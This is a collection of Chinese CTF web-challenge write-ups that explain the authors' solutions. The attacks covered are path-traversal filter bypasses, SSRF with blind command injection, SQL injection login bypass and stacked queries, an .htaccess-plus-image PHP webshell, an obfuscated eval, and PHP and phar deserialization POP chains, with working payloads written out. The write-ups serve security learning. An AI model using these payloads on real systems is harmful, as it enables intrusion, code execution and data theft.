    史迪仔的文件预览器 — Writeup

    题目类型：Web — 目录穿越（Path Traversal）

    题目地址：http://80-e887e1a6-2d07-4b5b-9e6e-5d3e06543451.challenge.ctfplus.cn/

    Flag：flag{1f0be3ba-b8f6-4a5a-9b05-c8d69e8769fd}

    题目概述

    页面是一个"文件预览器"，输入文件名即可查看实验室资料。默认提供示例文件 hello.txt。

    解题过程

    Step 1：查看默认文件

    先访问默认的 hello.txt，内容如下：

    Hello, ZeroG!
Welcome to PwnStars Cybersecurity Lab.

    没有有用信息，只是普通的欢迎语。

    Step 2：查看源码，发现线索

    右键查看页面源代码，在 HTML 底部发现一行注释：

    <!-- TODO: README.txt 后续需要整理 -->

    这说明服务器上存在一个 README.txt 文件，但页面上没有直接暴露。

    Step 3：直接读取 README.txt — 失败

    在文件名输入框中输入 README.txt，返回：

    File not found.

    说明 README.txt 不在当前可读目录中。

    Step 4：尝试目录穿越

    既然文件不在当前目录，尝试使用 ../ 进行目录穿越：

    ../README.txt

    仍然返回 File not found.，说明服务器对 ../ 进行了过滤（替换为空）。

    Step 5：绕过过滤 — 成功读取 README.txt

    服务器只做了一次 ../ → 空的替换，可以利用双写绕过。输入：

    ....//README.txt

    服务器将中间的 ../ 删除后，剩余字符重新拼成 ../README.txt，成功读到文件内容：

    Stitch File Preview System

Public files are stored in /files/.

For administrators:

Sensitive files are stored in /secret/.

    README.txt 揭示了目录结构：

    • 公开文件存储在 /files/
    • 敏感文件存储在 /secret/

    Step 6：读取 /secret/ 下的 flag

    既然知道敏感文件在 /secret/ 目录下，CTF 中常见的 flag 文件名就是 flag.txt。使用同样的绕过方式构造路径：

    ....//secret/flag.txt

    成功拿到 flag：

    flag{1f0be3ba-b8f6-4a5a-9b05-c8d69e8769fd}

    解题思路总结

    访问 hello.txt（无有用信息）
  → 查看源码，发现 HTML 注释提到 README.txt
    → 直接读 README.txt 失败（文件不在当前目录）
      → 尝试 ../ 目录穿越，失败（被过滤）
        → 用 ....// 双写绕过过滤，成功读取 README.txt
          → 发现敏感文件在 /secret/ 目录
            → ....//secret/flag.txt 读到 flag

    漏洞原理

    服务器对用户输入的 file 参数进行了简单的过滤 —— 将 ../ 替换为空字符串。但这个过滤只执行一次，攻击者可以通过双写 ....// 来绕过：

    输入:      ....//README.txt
过滤后:    ../README.txt    （中间的 ../ 被删除，两侧的 . 和 / 重新拼合）

    关键知识点

    知识点 说明
    查看源码 HTML 注释中经常藏有线索
    目录穿越 利用 ../ 跳出当前目录读取其他文件
    过滤绕过 双写 ....// 绕过单次 ../ 替换过滤
    信息收集 利用已读到的文件内容（README.txt）获取目录结构信息

    Stage2 — Can't see the result? Just take it out（Internal Shop）

    题目类型：Web — SSRF + 命令注入（无回显）

    题目地址：ZeroG CTF 2026 · Stage2（实例已关闭）

    Flag：flag{65e49f2f-8785-4b8a-809f-247089a45efd}

    题目概述

    和 ZeroG_2026（Stage 2） 不是同一题 —— 那篇是 PHP 弱类型与参数名变形，这篇是 SSRF。

    站点叫 Internal Shop，是一个"多平台价格比价系统"。输入商品页 URL，服务端去抓取并比价。

    导航里还有一个「系统信息」页 —— 后面就是从这里拿到内部接口的。

    解题过程

    Step 1：从两个页面提取信息

    首页是一个 URL 输入框，右上角有两个入口：「比价抓取」和「系统信息」。

    先进「系统信息」，页面上直接写了内部服务接口文档：

    内部 API 地址   http://127.0.0.1:5001
接口列表        /api/product?id=1
                /api/debug?cmd=whoami
说明            内部 API 仅允许本地访问，且主站不回显内部响应

    两条信息很关键：

    ① 内部服务只监听 127.0.0.1:5001，外网碰不到
② 主站不会把内部响应显示出来 —— 也就是说，就算打通了也是"盲"的

    Step 2：直接打 127.0.0.1 — 失败

    既然比价功能是"服务端抓取 URL"，那它就是天然的 SSRF 入口。直接把目标换成内部地址：

    http://127.0.0.1:5001/api/debug?cmd=whoami

    返回：

    抓取失败
非法的 URL

    说明 127.0.0.1 被黑名单挡了。

    Step 3：换一个写法绕过 — 成功

    127.0.0.1 有很多等价写法，只要目标解析到同一个地址、但不命中黑名单里的字符串就行：

    这里我用的是 127.1：

    http://127.1:5001/api/debug?cmd=whoami

    抓取成功了：

    但页面只说"已完成比价，结果稍后通过邮件发送" —— 内部响应确实不回显。

    Step 4：把结果带出来 — 重定向写到静态目录

    既然拿不到回显，那就让内部命令自己把结果写到主站能访问到的地方。

    static 这个目录是在源码里看到的：

    <link rel="stylesheet" href="/static/style.css">

    构造 payload，把命令输出重定向进去：

    http://127.1:5001/api/debug?cmd=whoami>static/out.txt

    然后直接访问 out.txt。

    Step 5：输出里混进了 Debug — 需要闭合前一句

    看 out.txt 时发现，命令的输出和 Debug 字样被一起打印了出来。所以猜测后端大概是：

    return "Debug: " + cmd_result

    也就是说，我传的 >static/out.txt 会把整个 echo 的结果改写进文件，而不只是命令输出。

    所以要先把前面那句截断，让重定向只作用于我自己的命令：

    http://127.1:5001/api/debug?cmd=;whoami>static/aa.txt

    闭合之后输出就干净了：

    root

    Step 6：换命令找 flag — 先查环境变量

    能写文件、能读文件，接下来就是找 flag。先查环境变量（比翻目录快）：

    http://127.1:5001/api/debug?cmd=;env>static/ea.txt

    在 ea.txt 里找到了：

    ZEROG_2026_FLAG=flag{65e49f2f-8785-4b8a-809f-247089a45efd}

    解题思路总结

    首页只有 URL 输入框
  → 进「系统信息」页，读到内部 API：127.0.0.1:5001 与 /api/debug?cmd=
    → 直接填 127.0.0.1，被判定为"非法的 URL"
      → 换成 127.1（同一地址的等价写法），抓取成功
        → 但页面不回显内部响应（题目明说了）
          → 用命令重定向把结果写进 static/ 目录，再直接访问该文件
            → out.txt 里混着 Debug 字样，说明前面有 echo
              → 用 ; 截断前一句，输出变干净（root）
                → 换 env 命令，拿到 ZEROG_2026_FLAG

    漏洞原理

    ① SSRF：服务端替我去请求

    比价功能必须由服务端抓取 URL，这个"抓取"没有限制目标 —— 于是可以把目标指向只有服务器自己能访问的 127.0.0.1:5001。

    ② 黑名单只匹配字符串，不匹配语义

    被拦：127.0.0.1
放过：127.1        ← 同一个地址，字符串不同

    127.1 是 IPv4 的短格式，解析器会自动补全成 127.0.0.1。黑名单拦的是写法，不是地址。

    ③ 无回显：把输出换成"写入可访问路径"

    正常思路   命令 → 响应 → 我看
无回显     命令 → 重定向写文件 → 我再访问那个文件

    ④ 闭合：输出里混了别的东西，说明它被包在一句话里

    看到 Debug: 和命令结果一起出现，就知道后端大概在做字符串拼接。; 把前一句结束掉，重定向才只作用于我的命令。

    关键知识点

    知识点 说明
    信息收集 「系统信息」页直接给出内部 API 与接口列表，比爆破快
    SSRF 服务端抓取功能可指向内网地址
    黑名单绕过 127.1 / 0 / 0.0.0.0 / [::1] / 十进制 / 十六进制 都等价于 127.0.0.1
    无回显处理 命令输出重定向到 web 可访问目录，再直接访问文件
    语句截断 输出混入拼接内容时，用 ; 结束前一句再执行自己的命令
    找 flag 顺序 先 env（快），再 ls /、find / -name "*flag*"

    Stage3 — Upload（极光科技）

    刚进去看到只有一个图片，直接先看看源码：

    发现有一个 admin 后台管理 —— 页脚里的 <a href="admin/">后台管理</a>。

    进后台

    进去看看，发现需要登陆。利用万能密码：

    admin'-- -

    成功进入。

    为什么这样能过 —— 因为后端大概是这样拼的：

    SELECT * FROM users WHERE username='$u' AND password='$p'

    填进去之后变成：

    SELECT * FROM users WHERE username='admin'-- -' AND password='...'
                                          ↑ 从这里开始全被注释掉

    -- 是 SQL 的注释符，后面那一整段（包括密码判断）都不执行了。

    所以它连密码都不用填对 —— 不用构造“条件为真”，只要让后半句消失就行。

    两个上传点

    进去后发现可以上传配置文件：

    🖼️ 更新海报      只收 JPEG / GIF / PNG
⚙️ 配置文件管理    收 .htaccess / .ini

    先试试上传图片：

    直接上传一个空的 jpg  →  提示格式不对
上传正常的 jpg        →  可以

    这里就知道了会对内容进行校验，所以这里就明确用图片马。

    先上传 .htaccess

    内容就一行：

    AddType application/x-httpd-php .jpg

    ⚠️ 这里要注意检查一遍。

    我最开始打成了 httped（多了 e 少了 d），导致后面一直以为我的命令被过滤了 —— 其实 PHP 根本没接管这个文件。

    判断依据：传完之后访问 poster.jpg，如果浏览器弹「保存文件」，就是 MIME 没被识别成 PHP；正常执行时 Content-Type 会变成 text/html。

    再用 exiftool 做图片马

    exiftool -Comment='<?php echo `$_GET[1]`; ?>' poster.jpg -o po1.jpg

    我本来随便拿了一个 jpg 来构造，但是因为它内容较大、二进制数据较多，里面或多或少会出现 <?。

    PHP 一旦在二进制里遇到 <? 就当成 PHP 开头来解析，后面跟着的是随机字节 —— 于是报错：

    Parse error: syntax error, unexpected character 0x0E
in /var/www/html/uploads/poster.jpg on line 31

    所以这里建议用小体量的 jpg：比如题目里的背景图 poster.jpg，直接下载下来用。

    然后访问：

    /uploads/poster.jpg?1=env

    就能看到 flag：

    ZeroG_2026_FLAG=ZeroGFlag{...}

    附：三个问题

    ① poster.jpg?v=1793248668 里的 v= 是什么

    缓存破坏参数（cache buster）。

    文件名永远是 poster.jpg，浏览器会缓存旧图；加一个每次变化的 v（通常是 Unix 时间戳）让 URL 变掉，强制重新下载。

    1793248668 ≈ 2026-10-29 的 Unix 时间戳（秒）

    服务器不读它，PHP 也不用它 —— 纯前端约定。 对我们反而有用：改完 payload 带上新 v，能确保看到的是新响应。

    ② 为什么用 env 找 flag，而不是找目录

    因为 flag 不一定是文件。

    这题的 flag 是平台在容器启动时通过环境变量注入的，不落盘：

    flag 不落盘 → 读文件读不到 → 备份/目录遍历/源码泄露都拿不到
只有真正拿到 RCE 才能读 → 考的是"能执行命令",不是"能猜路径"

    排查顺序应该是：

    ① ls -la /            先看有没有 flag 文件
② env                 没有就查环境变量
③ find / -name "*flag*"   再扫一遍
④ cat /proc/self/environ  环境变量换个读法

    ③ 能不能用 $_POST + 蚁剑

    能，但 echo$_POST["1"]`` 这种写法不行。

    echo \...`` 是命令执行** —— 参数被当 shell 命令跑。**

    蚁剑要的是代码执行** —— 它往参数里塞的是 PHP 代码，入口必须是：**

    eval($_POST['x'])

    而 eval 在黑名单里，所以要用拼接：

    $a='ev'.'al'; $a($_POST[1]);

    关键点：这道题的黑名单只扫上传文件的内容，不扫 HTTP 请求体 —— 所以蚁剑发过来的 body 里带什么词都不受影响。

    Unicorn Shop

    因为是独角兽商店，所以题目的意思应该就是让我们买下来（第 4 个 ultra unicorn，价格 1337.0）。

    填上去后提示只能输入一个字符，而不是说数字：

    Only one char(?) allowed!

    注意括号里那个 ? —— 它说的是「一个字符」，不是「一位数字」。

    这里想到 Unicode：用非数字字符去表示一个数字，找一个大于 1337 的即可。

    在 https://www.compart.com/en/unicode/ 这个网址中直接输入 number 关键字然后搜索，找到对应的数字即可。

    我这里用的是这个 ፼：

    得到 flag。

    为什么一个字符能过 1337

    ፼ 不是一个「奇怪的符号」，它是 Unicode 里的一个数字：

    项 值
    码点 U+137C
    官方名字 ETHIOPIC NUMBER TEN THOUSAND（埃塞俄比亚数字「一万」）
    字符长度 1
    代表的数值 10000

    关键点：后端比的是数值，不是字符长度。它应该是用 Python 的 unicodedata.numeric() 把字符转成数字再比较：

    >>> import unicodedata
>>> unicodedata.numeric('፼')
10000.0

    所以「只能一个字符」这条限制，和「不能超过 1337」这条限制，是两个维度的事 —— 一个字符完全可以代表一个很大的数。

    这一层是推断（没看到源码），但它能完整解释现象。

    通用思路：以后看到限制「几个字符」的地方，就想想有没有一个字符顶很多数值的东西 —— Unicode 数字、罗马数字、上下标数字都算。

    Magic Invoker（2026ZeroGCTF）

    源码 · 四类速览

    审计：能拿到 flag 的只有两处

    先审计四段代码，发现可以利用得到 flag 的只有两个地方：

    ① Invoker 里 __destruct 中的 eval —— 命令执行
② FlagReader 里 __call —— 读 /flag

    既然 FlagReader 可以直接读 flag，那先考虑这个方法。

    __call 的触发方法是调用了不存在的方法，这里要 $name === 'getFlag'。但是查看这些代码，根本没有调用这个方法的，所以这就是个陷阱，忽略它。

    Invoker 是直接的 sink

    接着看 eval 竟然在 __destruct 里 —— 那么只要传进序列化串就会触发。

    public function __destruct() {
    eval($this->code);
}

    所以只用一个 Invoker 对象就够了，不需要拼链。

    直接先查文件：

    O:7:"Invoker":1:{s:4:"code";s:14:"system('ls ');";}

    发现存在 index.php 和 challenge.php 两个文件。

    两个文件的关系和我原先的猜测相反

    这里 index.php 一般是网页入口，所以先看 challenge.php —— 它确实就是页面上那四个类的定义。

    那就接着查看 index.php：

    里面直接写了 flag 怎么拿：

    /*
 * Flag：由平台以环境变量 FLAG 动态注入，选手 RCE 后 env/printenv FLAG 读取。
 */

    env 能列，printenv FLAG 不行

    他这里说 env / printenv FLAG 都可以拿，我试了：

    env 和 printenv（不带参数）都能拿，加上 FLAG 就不行 —— 因为 printenv 是精确匹配的，而里面 FLAG 前面还有一串东西，所以匹配不到就查询不到。

    实际的变量名是：

    ZEROG_2026_FLAG=flag{...}

    所以 printenv FLAG 找的是 FLAG 这个不存在的名字，什么都不会打印；而 env 是全量列出，一眼就能看见。

    这也说明：index.php 注释里写的「环境变量 FLAG」和实际实现不一致 —— 注释是当时的意图，不代表现在的名字。

    注释可以过时，env 不会骗你。

    顺带一个坑：cat /index.php 为什么不行

    我一开始想 cat /index.php，结果什么都没出来；换成 cat index.php 就有了。

    因为这两个是完全不同的东西：

    /index.php   ← 文件系统根目录下的 index.php   → 不存在
index.php    ← 当前工作目录下的 index.php      → 存在

    / 是 Linux 文件系统的根，不是网站的根。网站目录一般是 /var/www/html 之类，而 cat 不给路径时用的是当前工作目录（cwd）—— 从 ls 的结果看，cwd 就是网站目录，所以相对路径能命中。

    而且 cat /index.php 报的 No such file or directory 走的是 stderr，system() 只回显 stdout，所以页面看起来就是「什么都没发生」。

    用 cat /index.php 2>&1 才能看见那条错误。

    ZeroG_2026（Stage 2）

    三层，一层比一层贴源码。

    第一层：正则 + 严格不等

    if (isset($_GET['zero'])
    && preg_match('/^ZeroG 2026!$/', $_GET['zero'])
    && $_GET['zero'] !== 'ZeroG 2026!') {

    审计代码第一层：正则里的 ^ 意味着从第一个字符就要匹配，$ 意味着到这里就要终止，所以原字符串要是 ZeroG 2026!，但是后面又要 !==（严格不等）。

    这里补充 PCRE 的 $：它除了匹配字符串末尾，还可以匹配"末尾换行之前"，所以在末尾加上 \n 也可以，这样就绕过了第一层。

    ?zero=ZeroG%202026!%0A

    第二层：intval 和算术运算用两套规则

    if (intval($_GET['xp']) < 2026 && intval($_GET['xp'] + 4) > 2030) {

    这里用到了 intval，就系统去补充了一下相关知识：

    行为 例子
    截断小数点 intval(0.9) = 0
    只取前导数字 intval("123abc") = 123
    反过来不行 intval("abc123") = 0（不是 123）
    带进制参数 intval($a, $b) $b = 0 时看前缀：0 开头按 8 进制、0x 开头按 16 进制，否则按 10 进制

    接着看到这里：既要小于 2026，又要加 4 之后大于 2030。

    最开始想的是用字符串改小进制，但这里不行。所以想到用 2025e9：

    intval('2025e9')  = 2025            ← 遇到 e 就直接停了
'2025e9' + 4      = 2.025e12        ← 2025×10⁹，算术运算先算完，才交给 intval

    同一个字符串，被两套规则解释：intval() 只认前导整数，算术运算认科学计数法。

    ?zero=ZeroG%202026!%0A&xp=2025e9

    第三层：弱等于模拟强等于 + 一个 [ 的妙用

    if (isset($_POST['Welcome__ctf.2026']) && isset($_POST['mm'])) {
    $a = $_POST['Welcome__ctf.2026'];
    $b = $_POST['mm'];
    if ($a !== $b && md5($a) == md5($b)) {

    用 ==（弱等于）去模拟 !==（强不等）： 找一组 MD5 值都以 0e 开头的数据：

    QNKCDZO   → md5 = 0e830400451993494058024219903391
240610708 → md5 = 0e462097431906509019562562988736854

    两个 0e... 在 == 下都被当成 0 × 10ⁿ = 0，所以相等；但原字符串不同，!== 也成立。

    接着构造：

    Welcome__ctf.2026=QNKCDZO&mm=240610708&code=system('cat /flag*');

    当然没有这么简单 —— 因为 PHP 会把参数名里的 . 转换成 _，所以这个名字根本出不来。

    我也卡在这里很久。

    最后发现的东西

    PHP 7.4 的源码逻辑：循环转换 . 和空格，但是遇到 [ 会直接把它替换成 \0（字符串截断符），然后跳出循环：

    跳出循环之后，PHP 认为这是数组语法，会去寻找与之配对的 ] —— 但是找不到！

    找不到之后，又会把刚刚的 \0 换回 _，恢复完整字符串：

    所以只要把其中一个 _ 改成 [，就能让结果刚好等于原来的名字：

    Welcome__ctf.2026   →  循环走完全程 → 点被转 → Welcome__ctf_2026   ✗
Welcome_[ctf.2026   →  在 [ 处 break → 点没被处理 → 恢复 [ 为 _ → Welcome__ctf.2026   ✓

    一个字符同时做了两件事：截断循环（让点逃过转换）+ 恢复之后补回那个下划线。

    最终 payload：

    Welcome_[ctf.2026=QNKCDZO&mm=240610708&code=system('cat /flag*');

    拿到 flag。

    cat /flag* 和 cat flag* 的区别

    这里试了一下：cat flag* 抓不到，cat /flag* 才能抓到。

    原因是当前工作目录。web 进程的 cwd 是网站目录（/var/www/html 之类），而 flag 文件在根目录 /：

    cat flag*     ← 相对路径，在网站目录里找 → 找不到
cat /flag*    ← 绝对路径，从根目录找     → 命中

    同一类问题在上一道题里是反过来的：那次 cat /index.php 失败、cat index.php 成功，因为文件就在 cwd 里。

    所以路径没有好坏，只有对不对得上文件所在的位置。

    一个版本细节

    intval('2025e9') 只在 PHP 5 上返回 2025。

    PHP 5:   intval('2025e9') = 2025            ← 遇到 e 就停
PHP 7.1: intval('2025e9') = 2025000000000   ← 也认科学计数法了

    我在本地 PHP 7.4 上实测确认过：intval('2025e9') 返回 2025000000000，第一个条件就直接不成立。

    所以这一关只在 PHP 5 的老环境上成立 —— 换个环境，同一个 payload 就废了。

    Stage3 — 重生之我在零重力屋顶当"卷王"

    题目是个小游戏：控制碰星娘飞过星环，攒到 3000 分才能领终点奖励。

    做这种题的第一步：F12

    做这种类型的题目，重要的是打开 F12、打开 Network，先玩一局，看它都发送了哪些请求。

    一局下来就两个请求：

    POST /api/run     201    开局
POST /api/claim   403    结算

    盯住 claim

    claim 出现了 grades 这个字段，对其进行 base64 解码：

    eyJzY29yZSI6MH0=   →   {"score":0}

    这不就是我的得分吗？那这里就明确了。

    {
  "runId": "9b337580-62ae-4e0a-9a90-96a5e17095ad",
  "grades": "eyJzY29yZSI6MH0="
}

    分数是浏览器自己算出来、自己 base64 一下、再交给服务器的 —— 服务器完全相信这个数字。

    base64 只是编码，不是加密，也不是签名。

    ⚠️ 有个先后依赖：/api/run 返回的不只是 runId，还有 expiresInSeconds: 1800（30 分钟有效）。

    所以不能只发 claim —— 得先拿一个有效的 runId，再拿它去结算。

    改分数

    直接修改分数为 3000，再做一次 base64 编码，抓包改掉 grades，发回去：

    {"score":3000}  →  eyJzY29yZSI6MzAwMH0=

    成功得到 flag。

    {
  "ok": true,
  "code": "TARGET_REACHED",
  "message": "终点信号已解锁",
  "score": 3000,
  "target": 3000,
  "flag": "ZeroG{...}"
}

    补充：为什么 base64 挡不住

    这段代码其实自己就写着答案：

    function encodeGrades(score) {
  return btoa(JSON.stringify({ score }));   // btoa = base64 编码
}

    函数名是 encode，不是 sign。

    这四个词的区别值得记：

    词 含义 能不能防改
    encode 编码（base64、hex、URL） ❌ 只是换衣服，谁都能脱
    encrypt 加密（AES、RSA） ✅ 但要密钥
    hash 哈希（md5、sha256） ✅ 单向，但这里只存不比对
    sign 签名（HMAC、RSA 签名） ✅ 改了就对不上

    只有最后一种能真正防篡改 —— 因为它需要服务器持有的密钥，前端拿不到。

    这类题的通法

    ① F12 → Network，玩一局，看发了哪些请求
② 找到"提交结果"的那个请求
③ 看提交的字段是怎么产生的：
     · 明文？          → 直接改
     · base64 / hex？  → 编码而已，解开改
     · 带签名？        → 找密钥（前端藏了也能拿到）
     · 服务器发的 token？→ 看能不能复用
④ 这个值是服务器算的，还是浏览器算的？
     浏览器算的 → 一定能伪造
     服务器算的 → 得去找逻辑漏洞

    这道题属于第 ④ 条最简单的那种：分数完完全全是浏览器算的。

    [HNCTF 2022 WEEK3] ez_phar

    源码

    <?php
show_source(__FILE__);
class Flag{
    public $code;
    public function __destruct(){
        // TODO: Implement __destruct() method.
        eval($this->code);
    }
}
$filename = $_GET['filename'];
file_exists($filename);
?>
upload something

    审计代码发现只要触发 __destruct 就可以执行代码，所以要想办法触发 __destruct。

    想到 phar 反序列化可以在没有 unserialize() 的情况下触发 __destruct —— 代码里唯一的入口就是 file_exists($filename)，而它正好是能吃 phar:// 的文件函数。

    为什么能这样：phar 文件的 manifest 里可以存一段序列化 metadata；任何函数只要访问 phar:// 开头的路径，PHP 就会解析这个 phar，解析时把 metadata 自动反序列化 —— 于是对象被重建，脚本结束时 __destruct() 自动执行。

    找上传点

    源代码强调了 upload，去访问一下 upload.php。

    先随便尝试上传一个 txt 文件，提示只能 jpg/jpeg。

    将 txt 文件修改后缀可以直接上传，所以就明确了这道题的方向：构造一个 phar 文件，修改后缀为 jpg 上传之后通过 phar:// 触发。

    造 phar

    <?php
class Flag {
    public $code;
}

$f = new Flag();
$f->code = "system('cat /fffl11laaaggg');";   // 第一步是 ls / 先找到 flag 文件

$p = new Phar(__DIR__.'/b.phar');
$p->startBuffering();
$p->addFromString('test.txt', 'x');
$p->setStub('<?php __HALT_COMPILER(); ?>');
$p->setMetadata($f);
$p->stopBuffering();
?>

    php 文件写好后通过 shell 执行：

    php.exe -d phar.readonly=0 ds.php

    就会生成一个 b.phar 的文件，将其后缀改完后上传。

    触发

    第一次我让 code 写的是 ls /（想先找 flag 文件），页面返回：

    Parse error: syntax error, unexpected end of file
in /var/www/html/index.php(7) : eval()'d code on line 1

    这行报错其实是最好的证据** —— 它同时说明了三件事：**

    报错里的信息 说明
    eval()'d code __destruct() 真的执行了
    index.php(7) 就是源码里 eval($this->code); 那一行
    syntax error phar 被解析、metadata 反序列化成功，只是 ls / 不是合法 PHP

    也就是说链路已经通了，只是内容不对。 把 code 换成合法的 PHP 语句后：

    最终 payload：

    ?filename=phar://upload/b.jpg/test.txt

    成功得到 flag。

    先试万能密码：

    1' or 1=1-- -

    看着是没什么用的。

    接着试其他的，发现了 select 等被过滤了：

    那么时间盲注、报错注入、联合查询、布尔盲注就都无法使用了 —— 这几种要么离不开 select，要么离不开 where。

    还有一处容易漏看：过滤名单里带了 \.（点）。点被挡，意味着 information_schema.tables 这种写法根本发不出去 —— 所以后面查表只能靠 show tables，不是因为我们想省 select，是因为连表名都没法用点拼出来。

    那就试试堆叠注入。堆叠查询可以一次执行多条独立语句，show、handler、rename、alter 这些都不需要 select，正好绕开过滤。

    发现可以。那么就分别进行查表和查列：

    1';show tables;-- -

    查到两个表：1919810931114514 和 words。

    1';show columns from `1919810931114514`;-- -


    1';show columns from `words`;-- -

    words 表里没有 flag。

    到这里有两种做法。

    做法一：handler

    handler 就是直接打开一张表、按行读：

    通过 handler 可以直接查询到 flag：

    1';handler `1919810931114514` open;
handler `1919810931114514` read first;
handler `1919810931114514` close;-- -

    得到 flag。

    注意：作为表名的数字要用反引号括起来 —— 1919810931114514 是一个以数字开头的名字，不加引号 MySQL 不认它是标识符。Linux 下单引号和反引号都可以（单引号在进 MySQL 之前就被 shell 吃掉了），Windows 下只能用反引号。

    做法二：改表名，让原始查询帮我查

    这里我们先推测初始查询语句。

    首先通过 1' -- - 的回显判断出是单引号闭合的。

    再通过 show 堆叠查询到两个表，通过查询发现 words 中有两个列，但是那个数字表中只有一个列。

    那么因为在初始查询的时候它返回的是两个列，所以这里就知道了它的语句是：

    select * from words where 列 = '1';

    至于为什么是 select *，是因为它回显有两个列；一个列返回的是数字，一个列返回的是数据，这里就可以知道查询的是 id 了。

    [MRCTF2020] Ezpop

    先审计代码

    发现是 PHP 序列化串（先附上相关知识点）：

    从终点往回找

    先找可以执行的地方。

    在 Modifier 类的 append 下有 include 可以利用，而调用 include 需要先有 __invoke 的调用。

    触发 __invoke 的方式是有对象被当成函数来调用，所以去找哪里是可以把对象当成函数来调用的 —— 观察到在 Test 类的 __get() 里会调用 $function()，也就达成了 __invoke 的触发要求。

    再看 __get 的触发条件：当访问不存在的属性时会被调用。也就是说，访问 Test 类中不存在的属性时会被调用。

    所以这里再去看最后一个类，发现 __toString 中会去访问 $this->str->source —— 这里我们只要让 str 为 Test 类，那它去访问 str->source 时就会触发 __get。

    接着要考虑 __toString 的触发条件：当把一个对象当成字符串来执行时会触发。

    那很明显就是 preg_match：

    preg_match('/正则表达式/', $字符串, $匹配结果数组);

    这里他把 $this->source 放进了 preg_match 的第二个参数，所以我们只要让他作为一个类 —— 又因为要同时包含 str，所以只能是 Show 类。

    最后是如何触发 __wakeup：它的触发条件是当使用 unserialize 时触发，那么就完成了闭环。

    逆推方向（找链的顺序）

    include ← __invoke ← __get ← __toString ← __wakeup ← unserialize($_GET['pop'])

    这是从终点往入口找的顺序。

    正向执行顺序（实际跑起来的样子）

    unserialize($_GET['pop'])
    → Show::__wakeup()          preg_match(..., $this->source) 把对象当字符串
    → Show::__toString()        $this->str->source 读不存在的属性
    → Test::__get('source')     $function = $this->p; $function()
    → Modifier::__invoke()      $this->append($this->var)
    → Modifier::append()        include($value)

    这条 POP 链就走完了。

    构造序列化

    class Modifier {
    protected $var = "php://filter/convert.base64-encode/resource=flag.php";
}
class Test { public $p; }
class Show { public $source; public $str; }

$pop = new Show;
$pop->source = new Show;        // 外层 source → 内层 Show（触发 __toString）
$pop->source->str = new Test;   // 内层的 str → Test（触发 __get）
$pop->source->str->p = new Modifier;   // Test 的 p → Modifier（触发 __invoke）
echo serialize($pop);
echo ("<br>");
echo urlencode(serialize($pop));

    四层的分工：

    层 属性 给谁用
    外层 Show source __wakeup 的 preg_match
    内层 Show str __toString 的 $this->str
    Test p __get 的 $function
    Modifier var append 的 include

    为什么要用伪协议

    这里因为直接 include 会把 PHP 代码执行掉（而 flag.php 里没有 echo，执行完什么都不输出）， 所以我们利用伪协议先把它编码成 base64 —— 编码后的文本不含 <?php，include 就会原样输出而不是执行。

    php://filter/convert.base64-encode/resource=flag.php

    \0 的坑

    注意：因为 var 的属性是 protected，序列化时会生成 \0*\0var（长度 6，两个空字节也算）。

    但是如果你直接把它复制到 URL 上，这两个空字节会被吞掉，s:6:"*var" 长度就对不上了。

    所以生成时最好就直接 urlencode()，避免出错：

    echo urlencode(serialize($pop));

    编码后这一小段是 s:6:%22%00*%00var%22。

    拿 flag

    最后得到 base64 编码的 flag，解码就好了。

    ?pop=<urlencode 后的整条串>
→ 页面吐出 base64
→ 解码 → flag.php 源码 → flag

    这题的收获

    第一次做 POP 链，最有用的一条是：

    不能从头读代码，要从能干活的那个函数（sink）往回找。

    ① 找 sink      include / eval / system / call_user_func
② 谁能碰到它    哪个魔术方法里调用了它
③ 那个魔术方法怎么触发   对象当字符串？当函数？读不存在的属性？
④ 一路往回，直到 unserialize

    中间那条 __get 最容易绕晕：它不是"属性值为空"，而是"这个类里根本没有这个属性"。 Test 只有 $p，所以读 ->source 必然触发 —— 你什么都不用设。
